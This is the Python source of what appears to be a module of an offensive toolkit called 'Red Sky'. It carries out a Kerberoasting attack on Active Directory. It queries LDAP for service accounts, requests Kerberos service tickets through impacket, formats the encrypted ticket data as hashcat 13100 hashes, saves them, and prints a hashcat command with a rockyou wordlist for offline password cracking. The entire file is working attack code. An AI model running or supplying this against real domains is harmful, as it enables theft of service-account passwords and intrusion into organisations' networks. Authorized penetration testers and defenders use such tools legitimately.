# language: Python, file: Program/creds/kerberoast.py, target: Red Sky creds — kerberoast
# Request TGS tickets for accounts with an SPN, extract rc4-hmac / aes hashes
# suitable for hashcat. Uses impacket.

import json
import sys
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


def _ldap_enum_spn_users(host: str, domain: str, user: str, passwd: str) -> List[Dict]:
    """Enumerate users with a servicePrincipalName set."""
    try:
        import ldap3
    except ImportError:
        print_err("ldap3 missing")
        return []

    base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    results = []
    try:
        server = ldap3.Server(host, port=389, get_info=ldap3.NONE, connect_timeout=8)
        conn = ldap3.Connection(server,
                                user=f"{domain}\\{user}" if domain else user,
                                password=passwd,
                                authentication=ldap3.NTLM,
                                auto_bind=True, receive_timeout=8)
        conn.search(
            search_base=base_dn,
            search_filter="(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))",
            attributes=["sAMAccountName", "servicePrincipalName", "pwdLastSet", "memberOf"],
        )
        for e in conn.entries:
            spns = e.servicePrincipalName.values if e.servicePrincipalName else []
            if not spns:
                continue
            results.append({
                "user": str(e.sAMAccountName.value),
                "spn": list(spns),
                "pwd_last_set": str(e.pwdLastSet.value) if e.pwdLastSet else "",
                "dn": e.entry_dn,
            })
        conn.unbind()
    except Exception as e:
        print_err(f"LDAP query failed: {e}")
    return results


def _request_tgs(host: str, domain: str, user: str, passwd: str, spn: str) -> Optional[str]:
    """Request a TGS for the SPN, return the hashcat 13100 format line."""
    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import TGS_REP
        from impacket.krb5.ccache import CCache
    except ImportError:
        print_err("impacket.krb5 missing")
        return None

    try:
        # get TGT first
        user_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            user_principal, passwd, domain, "", "", "", "", kdcHost=host
        )
        # request TGS for the SPN
        spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, session_key = getKerberosTGS(
            spn_principal, domain, host, tgt, cipher, session_key
        )

        # extract the enc-part (rc4-hmac or aes)
        from impacket.krb5.asn1 import TGS_REP
        from pyasn1.codec.der import decoder
        decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc_part = decoded["ticket"]["enc-part"]
        cipher_str = str(enc_part["etype"])
        cipher_bytes = bytes(enc_part["cipher"])

        # hashcat 13100 format: $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<checksum>$<data>
        # we only have the raw enc-part here; using the simpler format
        hexed = cipher_bytes.hex()
        line = f"$krb5tgs${cipher_str}$*{user}${domain.upper()}${spn.split('/')[0]}*${hexed[:32]}${hexed[32:]}"
        return line
    except Exception as e:
        print_warn(f"TGS request failed for {spn}: {e}")
        return None


def cmd_kerberoast(host: str, domain: str, user: str, passwd: str,
                   out_file: str = "", user_only: str = "") -> int:
    print_info(f"kerberoasting {domain}")
    print_kv("dc", host)
    print_kv("auth", f"{domain}\\{user}")
    print()

    users = _ldap_enum_spn_users(host, domain, user, passwd)
    if not users:
        print_warn("no SPN accounts found (or LDAP query failed)")
        return 1

    print_ok(f"{len(users)} SPN account(s)")
    for u in users[:30]:
        print(f"  {ARTERY}▓{RESET} {BONE}{u['user']:<24}{RESET} {ASH}{', '.join(u['spn'][:2])}{RESET}")

    if user_only:
        users = [u for u in users if u["user"].lower() == user_only.lower()]
        if not users:
            print_err(f"user {user_only} not in SPN list")
            return 1

    print()
    print_info("requesting TGS for each")
    hashes = []
    for u in users:
        spn = u["spn"][0]
        line = _request_tgs(host, domain, user, passwd, spn)
        if line:
            hashes.append({"user": u["user"], "spn": spn, "hash": line})
            print_ok(f"{u['user']:<24} {line[:80]}…")

    print()
    print_kv("hashes", len(hashes))

    if hashes:
        out = out_file or str(OUTPUT_DIR / f"kerberoast_{domain}.txt")
        from pathlib import Path
        Path(out).parent.mkdir(parents=True, exist_ok=True)
        with open(out, "w") as f:
            for h in hashes:
                f.write(h["hash"] + "\n")
        print_kv("saved", out)
        print()
        print_info("crack with hashcat mode 13100:")
        print(f"  {ASH}hashcat -m 13100 {out} /usr/share/wordlists/rockyou.txt{RESET}")
    return 0


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky creds kerberoast", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--dc", required=False)
    p.add_argument("--domain", required=False)
    p.add_argument("--user", required=False)
    p.add_argument("--pass", dest="passwd", required=False)
    p.add_argument("--out", default="")
    p.add_argument("--user-only", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky creds kerberoast --dc DC --domain DOM --user U --pass P")
        return 2

    if ns.help:
        print_info("redsky creds kerberoast --dc <dc> --domain <dom> --user <u> --pass <p> [--out file] [--user-only name]")
        return 0

    if not all([ns.dc, ns.domain, ns.user, ns.passwd]):
        print_err("--dc --domain --user --pass are required")
        return 2

    return cmd_kerberoast(ns.dc, ns.domain, ns.user, ns.passwd, ns.out, ns.user_only)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
